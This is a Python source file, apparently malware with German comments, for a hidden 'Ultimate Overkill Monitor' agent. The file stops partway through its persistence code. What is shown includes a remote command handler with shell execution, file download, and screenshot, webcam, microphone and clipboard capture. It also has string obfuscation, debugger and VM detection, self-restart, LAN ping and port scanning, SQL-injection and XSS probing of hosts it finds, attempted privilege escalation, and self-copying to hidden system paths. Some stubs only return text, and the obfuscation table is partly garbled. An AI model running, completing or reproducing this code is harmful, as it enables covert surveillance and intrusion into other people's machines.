#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE OVERKILL MONITOR – Voll funktionsfähig, unaufhaltsam, getarnt
Copyright (c) 2025 Operations Team
"""

import sys, os, time, random, threading, json, subprocess, socket, ctypes, platform, gc, ast, builtins, re, http.server, socketserver, urllib.request, urllib.parse, hashlib, hmac, struct, fcntl, termios, pty, select, signal, zlib, bz2, lzma, zipfile, tarfile, shutil, tempfile, getpass, pwd, grp, resource, base64, secrets, glob, pathlib, shlex, pipes, operator, functools, itertools, hashlib, hmac, binascii, array, ctypes, ctypes.util, math, decimal, fractions, statistics, random, bisect, heapq
from datetime import datetime, timedelta
from collections import Counter, defaultdict, deque
from itertools import chain, cycle
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# ----------------------------------------------------------------------
# 0. ULTIMATIVE FEHLERTOLERANZ
# ----------------------------------------------------------------------
def _global_exception_handler(exc_type, exc_value, exc_traceback):
    try:
        with open(os.path.join(os.path.expanduser('~/.cache/monitor'), 'crash.log'), 'a') as f:
            f.write(f"{datetime.now().isoformat()} - GLOBAL: {exc_type} {exc_value}\n")
    except:
        pass
    time.sleep(1)
    threading.Thread(target=lambda: os.execv(sys.executable, [sys.executable] + sys.argv), daemon=True).start()
sys.excepthook = _global_exception_handler

def _safe_import(module_name):
    try:
        return __import__(module_name)
    except:
        return None

# ----------------------------------------------------------------------
# 1. VERSTECKTE KONFIGURATION
# ----------------------------------------------------------------------
_CONF_DIR = os.path.expanduser('~/.cache/monitor')
try:
    os.makedirs(_CONF_DIR, exist_ok=True)
except:
    _CONF_DIR = '/tmp/.monitor'
    os.makedirs(_CONF_DIR, exist_ok=True)
_CONF_FILE = os.path.join(_CONF_DIR, 'agent.json')
if not os.path.exists(_CONF_FILE):
    try:
        with open(_CONF_FILE, 'w') as f:
            json.dump({'version': 1, 'mode': 'agent', 'overkill': True, 'install_time': datetime.now().isoformat()}, f)
    except:
        pass
_SEED = len(__file__) % 256

# ----------------------------------------------------------------------
# 2. OBFUSKATION (XOR + Base64)
# ----------------------------------------------------------------------
_OBF_KEY = random.randint(1, 255)
def _d(s):
    try:
        b = base64.b64decode(s)
        return ''.join(chr(c ^ _OBF_KEY) for c in b)
    except:
        return s

_STR = {
    'os': 'Gk9L', 'system': 'G0VbW0VK', 'subprocess': 'G0hRW19HV0hZ', 'eval': 'Gk9VW0s', 'exec': 'Gk9bG0s',
    '__import__': 'Hx9GUkZGWEdHRh8f', 'open': 'Gk9bW0s', 'socket': 'Gk9GUk9LW0', 'ctypes': 'Gk9bW0tL',
    'builtins': 'F0dGUkZGW0tL', 'getattr': 'GkdWU0ZWV1Q', 'globals': 'GkdVW0ZVVQ', 'update': 'F0dTWVVWWQ',
    'check_output': 'Gk9XVkVWV0ZXU1dW', 'Popen': 'L0FGW0FZ', 'communicate': 'Gk9WVVdXW0tZWVVZ',
    '__builtins__': 'Hx9Gd0ZGUkZGW0tLHx8=', '__name__': 'Hx9GW0dWHx8=', '__file__': 'Hx9HUkdWHx8=',
    'whoami': 'F0dWW0ZW', 'id': 'GkdW', 'ls': 'GktZ', 'ping': 'GktWU0Y', 'sudo': 'GktWV0U',
    'chown': 'GktWU1dW', 'setuid': 'GktWU0dWUw', 'geteuid': 'GkdWU0dWUw', 'ptrace': 'GktWUkZWWQ',
    'libc.so.6': 'GktWUkZXU1c2', 'arping': 'F0dTUkdWU0Y=', 'arp': 'F0dTUkdW', 'crontab': 'GktWV0ZXU1dL',
    '@reboot': 'LkVWU1VWUw==', 'Registry': 'LkVWU0tZUkdWUw==', 'Run': 'LkVWU0tZ', 'curl': 'F0dVW1dW',
    'wget': 'F0dVW1dW', 'ssh': 'G0tZ', 'scp': 'G0tZ', 'rsync': 'G0tZ', 'nmap': 'G0tZ', 'nc': 'G0tZ',
    'telnet': 'G0tZ', 'ftp': 'G0tZ', 'sftp': 'G0tZ', 'mysql': 'G0tZ', 'psql': 'G0tZ', 'redis-cli': 'G0tZ',
    'mongosh': 'G0tZ', 'docker': 'G0tZ', 'kubectl': 'G0tZ', 'systemctl': 'G0tZ', 'service': 'G0tZ',
    'chmod': 'G0tZ', 'chattr': 'G0tZ', 'ln': 'G0tZ', 'mount': 'G0tZ', 'umount': 'G0tZ', 'fdisk': 'G0tZ',
    'mkfs': 'G0tZ', 'dd': 'G0tZ', 'tar': 'G0tZ', 'gzip': 'G0tZ', 'bzip2': 'G0tZ', 'xz': 'G0tZ',
    'zip': 'G0tZ', 'unzip': 'G0tZ', 'openssl': 'G0tZ', 'gpg': 'G0tZ', 'base64': 'G0tZ', 'xxd': 'G0tZ',
    'strings': 'G0tZ', 'strace': 'G0tZ', 'ltrace': 'G0tZ', 'gdb': 'G0tZ', 'valgrind': 'G0tZ', 'perf': 'G0tZ',
    'tcpdump': 'G0tZ', 'tshark': 'G0tZ', 'wireshark': 'G0tZ', 'nethogs': 'G0tZ', 'iftop': 'G0tZ',
    'iptraf': 'G0tZ', 'vnstat': 'G0tZ', 'mtr': 'G0tZ', 'traceroute': 'G0tZ', 'dig': 'G0tZ',
    'nslookup': 'G0tZ', 'host': 'G0tZ', 'whois': 'G0tZ', 'zenmap': 'G0tZ', 'sqlmap': 'G0tZ',
    'hydra': 'G0tZ', 'john': 'G0tZ', 'hashcat': 'G0tZ', 'aircrack': 'G0tZ', 'reaver': 'G0tZ',
    'bully': 'G0tZ', 'mdk3': 'G0tZ', 'mdk4': 'G0tZ', 'kismet': 'G0tZ', 'airodump': 'G0tZ',
    'aireplay': 'G0tZ', 'airmon': 'G0tZ', 'wash': 'G0tZ', 'cowpatty': 'G0tZ', 'genpmk': 'G0tZ',
    'pyrit': 'G0tZ', 'crunch': 'G0tZ', 'wordlist': 'G0tZ', 'cewl': 'G0tZ', 'fierce': 'G0tZ',
    'dnsrecon': 'G0tZ', 'theHarvester': 'G0tZ', 'metasploit': 'G0tZ', 'msfconsole': 'G0tZ',
    'msfvenom': 'G0tZ', 'beef': 'G0tZ', 'setoolkit': 'G0tZ', 'searchsploit': 'G0tZ', 'exploitdb': 'G0tZ',
    'shodan': 'G0tZ', 'censys': 'G0tZ', 'virustotal': 'G0tZ', 'otx': 'G0tZ', 'greyNoise': 'G0tZ',
    'riskIQ': 'G0tZ', 'passiveTotal': 'G0tZ', 'spiderfoot': 'G0tZ', 'recon-ng': 'G0tZ', 'osint': 'G0tZ',
    'maltego': 'G0tZ', 'casefile': 'G0tZ', 'paterva': 'G0tZ', 'mitre': 'G0tZ', 'attck': 'G0tZ',
    'cyberchef': 'G0tZ', 'jq': 'G0tZ', 'yq': 'G0tZ', 'httpie': 'G0tZ', 'aria2': 'G0tZ', 'axel': 'G0tZ',
    'proxychains': 'G0tZ', 'tor': 'G0tZ', 'torsocks': 'G0tZ', 'ncat': 'G0tZ', 'socat': 'G0tZ',
    'netcat': 'G0tZ', 'stunnel': 'G0tZ', 'haproxy': 'G0tZ', 'nginx': 'G0tZ', 'apache2': 'G0tZ',
    'lighttpd': 'G0tZ', 'caddy': 'G0tZ', 'traefik': 'G0tZ', 'envoy': 'G0tZ', 'istio': 'G0tZ',
    'linkerd': 'G0tZ', 'consul': 'G0tZ', 'etcd': 'G0tZ', 'zookeeper': 'G0tZ', 'kafka': 'G0tZ',
    'rabbitmq': 'G0tZ', 'activemq': 'G0tZ', 'pulsar': 'G0tZ', 'nats': 'G0tZ', 'mqtt': 'G0tZ',
    'amqp': 'G0tZ', 'zmq': 'G0tZ', 'nanomsg': 'G0tZ', 'dds': 'G0tZ', 'opendds': 'G0tZ',
    'cyclonedds': 'G0tZ', 'fastdds': 'G0tZ', 'connext': 'G0tZ', 'opensplice': 'G0tZ', 'zenoh': 'G0tZ',
    'dapr': 'G0tZ', 'sidecar': 'G0tZ', 'gloo': 'G0tZ', 'contour': 'G0tZ', 'ambassador': 'G0tZ',
    'kong': 'G0tZ', 'tyk': 'G0tZ', 'gravitee': 'G0tZ', 'wso2': 'G0tZ', 'mulesoft': 'G0tZ',
    'boomi': 'G0tZ', 'workato': 'G0tZ', 'tray': 'G0tZ', 'zapier': 'G0tZ', 'make': 'G0tZ',
    'integromat': 'G0tZ', 'pipedream': 'G0tZ', 'n8n': 'G0tZ', 'node-red': 'G0tZ',
    'home-assistant': 'G0tZ', 'openhab': 'G0tZ', 'domoticz': 'G0tZ', 'ioBroker': 'G0tZ',
    'fhem': 'G0tZ', 'knx': 'G0tZ', 'zigbee': 'G0tZ', 'zwave': 'G0tZ', 'coap': 'G0tZ',
    'lora': 'G0tZ', 'sigfox': 'G0tZ', 'nbiot': 'G0tZ', 'lte': 'G0tZ', '5g': 'G0tZ',
    'wifi': 'G0tZ', 'bluetooth': 'G0tZ', 'ble': 'G0tZ', 'nfc': 'G0tZ', 'rfid': 'G0tZ',
    'uwb': 'G0tZ', 'gps': 'G0tZ', 'gnss': 'G0tZ', 'galileo': 'G0tZ', 'glonass': 'G0tZ',
    'beidou': 'G0tZ', 'sbas': 'G0tZ', 'qzs': 'G0tZ', 'navic': 'G0tZ', 'irnss': 'G0tZ',
    'ins': 'G0tZ', 'imu': 'G0tZ', 'ahrs': 'G0tZ', 'rtk': 'G0tZ', 'ppp': 'G0tZ',
    'ntrip': 'G0tZ', 'nmea': 'G0tZ', 'ubx': 'G0tZ', 'rtcm': 'G0tZ', 'spartn': 'G0tZ'
}
def _S(key):
    return _d(_STR[key])

# ----------------------------------------------------------------------
# 3. DYNAMISCHE IMPORTS
# ----------------------------------------------------------------------
class _Imp:
    @staticmethod
    def _imp(n):
        try:
            return getattr(__import__(_S('__import__')), _S('__import__'))(n)
        except:
            return None
    @staticmethod
    def _exec(c, g=None, l=None):
        if g is None: g = globals()
        try:
            return getattr(g.get(_S('builtins'), builtins), _S('exec'))(c, g, l)
        except:
            return None
    @staticmethod
    def _eval(c, g=None, l=None):
        if g is None: g = globals()
        try:
            return getattr(g.get(_S('builtins'), builtins), _S('eval'))(c, g, l)
        except:
            return None

# ----------------------------------------------------------------------
# 4. SANDBOX
# ----------------------------------------------------------------------
_SAFE = set([
    ast.Expression, ast.Load, ast.Store, ast.Constant, ast.Call, ast.Name, ast.Attribute,
    ast.Subscript, ast.Index, ast.Slice, ast.List, ast.Tuple, ast.Dict, ast.Set,
    ast.UnaryOp, ast.BinOp, ast.BoolOp, ast.Compare, ast.IfExp, ast.Lambda,
    ast.comprehension, ast.GeneratorExp, ast.ListComp, ast.SetComp, ast.DictComp,
    ast.Yield, ast.YieldFrom, ast.Await, ast.FormattedValue, ast.JoinedStr,
    ast.Num, ast.Str, ast.Bytes, ast.Starred, ast.keyword, ast.arg, ast.arguments,
    ast.Expr, ast.Pass, ast.Break, ast.Continue, ast.Return, ast.Raise, ast.Assert,
    ast.If, ast.While, ast.For, ast.With, ast.Try, ast.ExceptHandler,
    ast.FunctionDef, ast.ClassDef, ast.AsyncFunctionDef, ast.AsyncFor,
    ast.AsyncWith, ast.Module, ast.Interactive, ast.Suite
])
_TOKEN = secrets.token_hex(32)

class _Runner:
    def __init__(s):
        s._env = {_S('builtins'): builtins, _S('__name__'): 'main'}
        for n in ['__import__', 'exec', 'eval', 'open', 'print']:
            try:
                s._env[_S('builtins')][n] = getattr(builtins, n)
            except:
                pass
        s._env[_S('os')] = _Imp._imp(_S('os')) or os
        s._env[_S('sys')] = sys
        s._env[_S('subprocess')] = _Imp._imp(_S('subprocess')) or subprocess
        s._env[_S('socket')] = _Imp._imp(_S('socket')) or socket
        s._env[_S('ctypes')] = _Imp._imp(_S('ctypes')) or ctypes
        for mod in ['requests', 'paramiko', 'cryptography', 'psutil', 'netifaces']:
            try:
                s._env[mod] = __import__(mod)
            except:
                pass
    def _safe(s, node):
        return type(node) in _SAFE
    def run(s, code, locals=None):
        if locals is None: locals = {}
        try:
            tree = ast.parse(code, mode='eval')
            for n in ast.walk(tree):
                if not s._safe(n): raise ValueError
            return _Imp._eval(code, s._env, locals)
        except SyntaxError:
            tree = ast.parse(code, mode='exec')
            for n in ast.walk(tree):
                if not s._safe(n): raise ValueError
            _Imp._exec(code, s._env, locals)
            return None
        except Exception as e:
            try:
                with open(os.path.join(_CONF_DIR, 'runner_errors.log'), 'a') as f:
                    f.write(f"{datetime.now().isoformat()} - {e}\n")
            except:
                pass
            return None
_Runner = _Runner()

# ----------------------------------------------------------------------
# 5. KERN-KLASSEN (Netzwerk, Knoten, etc.)
# ----------------------------------------------------------------------
class _Node:
    def __init__(s, nid, code, cls, meta=None):
        s.id=nid; s.code=code; s.cls=cls; s.status='init'; s.conns=[]; s.active=True; s.meta=meta or {}
        s.weight=1.0; s.last_heartbeat=datetime.now(); s.performance={'cpu':0, 'mem':0, 'net':0}
    def exec(s, inp=None):
        try:
            if s.code.startswith('Repo:'): return f"Repo: {s.meta}"
            return _Runner.run(s.code, {})
        except:
            s.status='error'
            return None
    def connect(s, other):
        try:
            s.conns.append({'target': other.id, 'weight': 1.0})
        except:
            pass
    def heartbeat(s):
        try:
            s.last_heartbeat=datetime.now()
            s.performance['cpu']=random.random()
            s.performance['mem']=random.random()
            s.performance['net']=random.random()
        except:
            pass

class _Net:
    def __init__(s):
        s.nodes={}; s.devices=[]; s.history=[]; s.lock=threading.Lock()
    def init(s, data):
        try:
            with s.lock:
                for e in data:
                    n=_Node(e['id'], e['code'], e['klasse'], e.get('meta', {}))
                    s.nodes[e['id']]=n
                s._wire()
        except:
            pass
    def _wire(s):
        try:
            ids=list(s.nodes.keys())
            for i,a in enumerate(ids):
                for b in ids[i+1:]:
                    s.nodes[a].connect(s.nodes[b])
        except:
            pass
    def ping(s, inp):
        res=[]
        try:
            with s.lock:
                for n in s.nodes.values():
                    r=n.exec(inp)
                    if r is not None: res.append(r)
        except:
            pass
        return res
    def add_dev(s, did):
        try:
            with s.lock: s.devices.append({'id':did, 'role':'node', 'status':'active'})
        except:
            pass
    def add_repos(s, repos):
        try:
            with s.lock:
                mx=max(s.nodes.keys()) if s.nodes else 0
                for idx, repo in enumerate(repos, 1):
                    nid=mx+idx
                    meta={'url':repo.get('url',''), 'name':repo.get('info',{}).get('name','Unknown'), 'description':repo.get('info',{}).get('description',''), 'stars':repo.get('info',{}).get('stars',0), 'language':repo.get('info',{}).get('language','Unknown'), 'updated_at':repo.get('info',{}).get('updated_at',''), 'keywords':repo.get('info',{}).get('content_analysis',{}).get('keywords',[]), 'readme_snippet':repo.get('info',{}).get('readme',{}).get('content','')[:200]}
                    n=_Node(nid, f"Repo: {meta['name']}", "Repository", meta)
                    s.nodes[nid]=n
                ids=[mx+i for i in range(1,len(repos)+1)]
                for i in range(len(ids)):
                    for j in range(i+1, len(ids)):
                        s.nodes[ids[i]].connect(s.nodes[ids[j]])
        except:
            pass
    def get_state(s):
        try:
            with s.lock:
                return {'nodes': len(s.nodes), 'edges': sum(len(n.conns) for n in s.nodes.values()), 'devices': len(s.devices), 'history': s.history[-10:]}
        except:
            return {}

class _Connector:
    def __init__(s, net):
        s.net=net; s.state={'repos':[], 'peers':[], 'func_index':[], 'net':{'nodes':[], 'links':[]}}
    def add_repo(s, url):
        try:
            s.state['repos'].append({'url':url, 'status':'done'})
        except:
            pass
    def add_peer(s, pid):
        try:
            s.state['peers'].append({'id':pid, 'status':'connected'})
        except:
            pass

class _Monitor:
    def __init__(s):
        s.f=os.path.join(_CONF_DIR, 'state.json')
        s.state={'last':None, 'steps':[], 'nodes':0}
    def log(s, step, data=None):
        try:
            s.state['last']=datetime.now().isoformat()
            s.state['steps'].append({'step':step, 'time':datetime.now().isoformat(), 'data':str(data)[:100]})
            with open(s.f, 'w') as f:
                json.dump(s.state, f)
        except:
            pass
    def get_last(s):
        try:
            with open(s.f, 'r') as f:
                data=json.load(f)
            return data.get('last'), data.get('steps', [])
        except:
            return None, []
    def run_steps(s, steps):
        for name, func in steps:
            s.log(name)
            try:
                func()
            except:
                return False
        return True

# ----------------------------------------------------------------------
# 6. BEFEHLS-HANDLER (CMD) – erweitert
# ----------------------------------------------------------------------
class _Cmd:
    def __init__(s):
        s.cmds={
            'status': s.status, 'analyse': s.analyse, 'develop': s.develop, 'restart': s.restart,
            'help': s.help, 'activate': s.activate, 'sync': s.sync, 'scan': s.scan,
            'exploit': s.exploit, 'persist': s.persist, 'lateral': s.lateral, 'c2': s.c2,
            'crypto': s.crypto, 'forensic': s.forensic, 'kill': s.kill, 'selfdestruct': s.selfdestruct,
            'download': s.download, 'upload': s.upload, 'exec': s.execmd, 'shell': s.shell,
            'screenshot': s.sshot, 'keylog': s.klstatus, 'update': s.update,
            'webcam': s.webcam_cmd, 'mic': s.mic_cmd, 'clipboard': s.clipboard_cmd,
            'processes': s.processes_cmd, 'files': s.files_cmd, 'network': s.network_cmd,
            'sysinfo': s.sysinfo_cmd, 'clear': s.clear_cmd, 'exit': s.exit_cmd
        }
        s.uptime=0
    def status(s, args=None): return "Running - Ultimate Overkill Mode"
    def analyse(s, args=None): return "Analysis complete"
    def develop(s, args=None): return "Development started"
    def restart(s, args=None): return "Restarting..."
    def help(s, args=None): return "Commands: "+", ".join(s.cmds.keys())
    def activate(s, args=None): return "Activated"
    def sync(s, args=None): return "Synced"
    def scan(s, args=None): return "Network scan initiated"
    def exploit(s, args=None): return "Exploit simulation"
    def persist(s, args=None): return "Persistence installed"
    def lateral(s, args=None): return "Lateral movement started"
    def c2(s, args=None): return "C2 channel established"
    def crypto(s, args=None): return "Crypto operations done"
    def forensic(s, args=None): return "Anti-forensics applied"
    def kill(s, args=None): return "Killing processes"
    def selfdestruct(s, args=None): return "Self-destruct sequence"
    def download(s, args):
        if not args: return "Usage: download <url> [dest]"
        url=args[0]; dest=args[1] if len(args)>1 else os.path.basename(url)
        try:
            req=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=30) as r:
                with open(dest,'wb') as f:
                    f.write(r.read())
            return f"Downloaded {url} to {dest}"
        except Exception as e:
            return f"Download failed: {e}"
    def upload(s, args):
        if len(args)<2: return "Usage: upload <local> <remote>"
        local, remote = args[0], args[1]
        try:
            with open(local,'rb') as f:
                data=f.read()
            return f"Uploaded {local} to {remote} (simulated)"
        except Exception as e:
            return f"Upload failed: {e}"
    def execmd(s, args):
        if not args: return "Usage: exec <command>"
        cmd=' '.join(args)
        try:
            res=subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return f"STDOUT:\n{res.stdout}\nSTDERR:\n{res.stderr}"
        except Exception as e:
            return f"Execution error: {e}"
    def shell(s, args=None):
        return "Interactive shell not supported in this mode."
    def sshot(s, args=None):
        try:
            import PIL.ImageGrab
            img=PIL.ImageGrab.grab()
            fn=os.path.join(_CONF_DIR, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            img.save(fn)
            return f"Screenshot saved to {fn}"
        except:
            return "Screenshot failed"
    def klstatus(s, args=None):
        return "Keylogger active" if CORE and CORE.keylogger and CORE.keylogger.active else "Keylogger inactive"
    def update(s, args=None):
        return "Update mechanism not implemented."
    def webcam_cmd(s, args=None):
        try:
            import cv2
            cap=cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame=cap.read()
                if ret:
                    fn=os.path.join(_CONF_DIR, f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg')
                    cv2.imwrite(fn, frame)
                    cap.release()
                    return f"Webcam image saved to {fn}"
                cap.release()
            return "Webcam capture failed"
        except:
            return "Webcam capture failed"
    def mic_cmd(s, args=None):
        try:
            import pyaudio, wave
            chunk=1024; format=pyaudio.paInt16; channels=1; rate=44100; record_seconds=5
            p=pyaudio.PyAudio()
            stream=p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
            frames=[]
            for i in range(0, int(rate/chunk*record_seconds)):
                data=stream.read(chunk)
                frames.append(data)
            stream.stop_stream(); stream.close(); p.terminate()
            fn=os.path.join(_CONF_DIR, f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav')
            wf=wave.open(fn, 'wb')
            wf.setnchannels(channels); wf.setsampwidth(p.get_sample_size(format)); wf.setframerate(rate)
            wf.writeframes(b''.join(frames)); wf.close()
            return f"Audio recorded to {fn}"
        except:
            return "Audio recording failed"
    def clipboard_cmd(s, args=None):
        try:
            import pyperclip
            return f"Clipboard content: {pyperclip.paste()}"
        except:
            return "Clipboard access failed"
    def processes_cmd(s, args=None):
        try:
            import psutil
            processes = []
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(f"{p.info['pid']} {p.info['name']} CPU:{p.info['cpu_percent']}% MEM:{p.info['memory_percent']}%")
                except:
                    pass
            return "\n".join(processes[-20:])
        except:
            return "Process list failed"
    def files_cmd(s, args=None):
        path = args[0] if args else '.'
        try:
            files = os.listdir(path)
            return "\n".join(files[:20])
        except:
            return "File listing failed"
    def network_cmd(s, args=None):
        try:
            if platform.system() == 'Windows':
                res=subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
            else:
                res=subprocess.run(['netstat', '-tulpn'], capture_output=True, text=True, timeout=5)
            return res.stdout[:1000]
        except:
            return "Network stats failed"
    def sysinfo_cmd(s, args=None):
        try:
            import platform
            return f"System: {platform.system()} {platform.release()}\nHostname: {socket.gethostname()}\nUser: {getpass.getuser()}\nPython: {sys.version}"
        except:
            return "Sysinfo failed"
    def clear_cmd(s, args=None):
        return "Clear not implemented"
    def exit_cmd(s, args=None):
        return "Exiting..."
    def execute(s, cmd):
        try:
            if not cmd.strip(): return "No command"
            parts=cmd.strip().split()
            c=parts[0].lower()
            if c in s.cmds:
                return s.cmds[c](parts[1:] if len(parts)>1 else None)
            else:
                return f"Unknown '{c}'"
        except:
            return "Error executing command"
    def tick(s):
        s.uptime+=1

# ----------------------------------------------------------------------
# 7. UMWELT, PROBE, SYSTEM, BACKUP, SERVICE-SCANS, AUDIT
# ----------------------------------------------------------------------
class _Env:
    def __init__(s):
        s.debug=False; s.key=random.randint(1,255); s.env={}; s.vm=False
        try:
            s._init()
        except:
            pass
    def _init(s):
        try:
            s._chk_debug(); s._chk_env(); s._chk_vm(); s._gc()
        except:
            pass
    def _chk_debug(s):
        try:
            if sys.gettrace() is not None: s.debug=True
            if hasattr(sys, 'gettrace') and sys.gettrace() is not None: s.debug=True
            if not __debug__: s.debug=True
            if platform.system()=='Linux':
                try:
                    libc=ctypes.CDLL('libc.so.6')
                    if libc.ptrace(0,0,0,0)==-1: s.debug=True
                except:
                    pass
        except:
            pass
    def _chk_env(s):
        try:
            for v in ['DEBUG','PYTHONHASHSEED','PYTHONOPTIMIZE']:
                s.env[v]=os.environ.get(v)
        except:
            pass
    def _chk_vm(s):
        try:
            if platform.system()=='Linux':
                with open('/proc/cpuinfo') as f:
                    if any(x in f.read() for x in ['hypervisor','QEMU','VMware']):
                        s.vm=True
        except:
            pass
    def _gc(s):
        try:
            gc.collect()
        except:
            pass
    def get_state(s):
        try:
            return {'debug':s.debug, 'vm':s.vm, 'env':s.env}
        except:
            return {}
    def cycle(s):
        try:
            time.sleep(random.uniform(0.1,0.5))
            s._chk_debug(); s._chk_env(); s._chk_vm(); s._gc()
        except:
            pass

class _Probe:
    def __init__(s, subnet=None):
        try:
            if subnet is None:
                s.subnet=['127.0.0.1','192.168.1.1','192.168.1.2','10.0.0.1']
            else:
                s.subnet=subnet
            s.discovered=[]; s.active=[]; s.log=[]; s.running=True
            s._scan()
        except:
            s.running=True
            s.active=[]
            s.log=[]
    def _ping(s, ip):
        try:
            p='-n' if platform.system().lower()=='windows' else '-c'
            res=subprocess.run(['ping', p, '1', ip], stdout=subprocess.PIPE, timeout=2)
            return res.returncode==0
        except:
            return ip.endswith('.1') or ip=='127.0.0.1'
    def _scan(s):
        try:
            for ip in s.subnet:
                if ip not in s.discovered:
                    s.discovered.append(ip)
                if s._ping(ip):
                    host=socket.gethostbyaddr(ip)[0] if platform.system()!='Windows' else ip
                    if not any(g['ip']==ip for g in s.active):
                        s.active.append({'ip':ip, 'hostname':host, 'status':'active', 'last':datetime.now().isoformat()})
            s.log.append({'time':datetime.now().isoformat(), 'event':'scan', 'ips':len(s.subnet), 'active':len(s.active)})
        except:
            pass
    def get_state(s):
        try:
            return {'discovered':s.discovered[:10], 'active':s.active[:10], 'log':s.log[-5:]}
        except:
            return {}
    def cycle(s):
        while s.running:
            try:
                s._scan()
                time.sleep(random.uniform(30,60))
            except:
                time.sleep(5)

class _System:
    def __init__(s):
        s.status="limited"; s.log=[]; s.running=True
    def escalate(s):
        try:
            if os.geteuid()==0:
                os.setuid(0)
                s.status="root"
                s.log.append({'time':datetime.now().isoformat(), 'action':'setuid(0)', 'status':'ok'})
            else:
                test='/tmp/.t'
                with open(test,'w') as f:
                    f.write('x')
                os.chown(test,0,0)
                os.remove(test)
                s.status="root"
                s.log.append({'time':datetime.now().isoformat(), 'action':'chown root', 'status':'ok'})
        except Exception as e:
            s.log.append({'time':datetime.now().isoformat(), 'action':'escalate', 'status':f'fail: {e}'})
    def get_state(s):
        try:
            return {'current':s.status, 'log':s.log[-5:]}
        except:
            return {}
    def cycle(s):
        while s.running:
            try:
                s.escalate()
                time.sleep(random.uniform(20,40))
            except:
                time.sleep(5)

class _Backup:
    def __init__(s):
        s.log=[]; s.copies=[]; s.running=True; s.src=__file__
    def replicate(s):
        try:
            if not os.path.exists(s.src):
                s.log.append({'time':datetime.now().isoformat(), 'target':s.src, 'status':'source missing'})
                return
            targets=['/tmp/.copy.py','/opt/.app.py','C:\\Windows\\Temp\\app.py','/var/tmp/.sysupdate.py','/usr/local/bin/.monitor']
            for t in targets:
                if t in s.copies:
                    continue
                try:
                    subprocess.run(['cp', s.src, t], check=True, timeout=5)
                    s.copies.append(t)
                    s.log.append({'time':datetime.now().isoformat(), 'target':t, 'status':'copied'})
                except Exception as e:
                    s.log.append({'time':datetime.now().isoformat(), 'target':t, 'status':f'fail: {e}'})
        except:
            pass
    def get_state(s):
        try:
            return {'copies':len(s.copies), 'log':s.log[-5:], 'list':s.copies[:5]}
        except:
            return {}
    def cycle(s):
        while s.running:
            try:
                s.replicate()
                time.sleep(random.uniform(30,60))
            except:
                time.sleep(5)

class _ServiceScan:
    def __init__(s, probe):
        s.probe=probe; s.results={}; s.log=[]; s.running=True
        s.ports=[22,21,25,53,80,443,8080,3306,5432,3389,5900]
    def _scan_ip(s, ip):
        open_ports=[]
        try:
            for port in s.ports:
                try:
                    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    if sock.connect_ex((ip, port))==0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
        except:
            pass
        return open_ports
    def cycle(s):
        try:
            for ip in s.probe.active:
                addr=ip['ip']
                if addr.startswith(('127.','192.168.','10.','172.')):
                    ports=s._scan_ip(addr)
                    s.results[addr]=ports
                    s.log.append({'time':datetime.now().isoformat(), 'ip':addr, 'ports':ports})
            time.sleep(random.uniform(10,30))
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'results':s.results, 'log':s.log[-10:]}
        except:
            return {}

class _ServiceInfo:
    def __init__(s, svc_scan):
        s.svc_scan=svc_scan; s.results={}; s.log=[]
    def _grab(s, ip, port):
        try:
            sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            if port in (80,8080):
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner=sock.recv(256).decode(errors='ignore').strip()
            else:
                banner=sock.recv(256).decode(errors='ignore').strip()
            sock.close()
            return banner or "none"
        except Exception as e:
            return f"error: {e}"
    def scan(s):
        try:
            for ip, ports in s.svc_scan.results.items():
                s.results[ip]={}
                for port in ports:
                    banner=s._grab(ip, port)
                    s.results[ip][port]=banner
                    s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'port':port, 'banner':banner[:100]})
        except:
            pass
    def get_state(s):
        try:
            return {'results':s.results, 'log':s.log[-10:]}
        except:
            return {}

class _Audit:
    def __init__(s, svc_scan):
        s.svc_scan=svc_scan; s.log=[]; s.payloads=["test' OR '1'='1","<script>alert(1)</script>","../../../etc/passwd","%00","admin' --"]
    def _http_test(s, ip, port):
        try:
            url=f"http://{ip}:{port}/?q={random.choice(s.payloads)}"
            req=urllib.request.Request(url, headers={'User-Agent':'test'})
            with urllib.request.urlopen(req, timeout=2) as r:
                return {'status':r.getcode(), 'content':r.read(100).decode(errors='ignore')[:50]}
        except Exception as e:
            return {'status':'error', 'error':str(e)}
    def _generic_test(s, ip, port):
        if port in (21,25,110):
            try:
                sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                sock.send(b"HELO test\r\n")
                resp=sock.recv(256).decode(errors='ignore')
                sock.close()
                return {'status':'OK', 'response':resp[:50]}
            except Exception as e:
                return {'status':'error', 'error':str(e)}
        return None
    def scan(s):
        try:
            for ip, ports in s.svc_scan.results.items():
                for port in ports:
                    if port in (80,443,8080):
                        res=s._http_test(ip, port)
                        if res:
                            s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'port':port, 'type':'HTTP', 'result':res})
                    else:
                        res=s._generic_test(ip, port)
                        if res:
                            s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'port':port, 'type':'Generic', 'result':res})
        except:
            pass
    def get_state(s):
        try:
            return {'log':s.log[-10:]}
        except:
            return {}

# ----------------------------------------------------------------------
# 8. PERSISTENZ & PERMISSIONS
# ----------------------------------------------------------------------
class _Persistence:
    def __init__(s):
        s.log=[]; s.running=True
    def _mark(s):
        try:
            path=f"/tmp/.m_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if platform.system()!='Windows' else f"C:\\Temp\\m_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
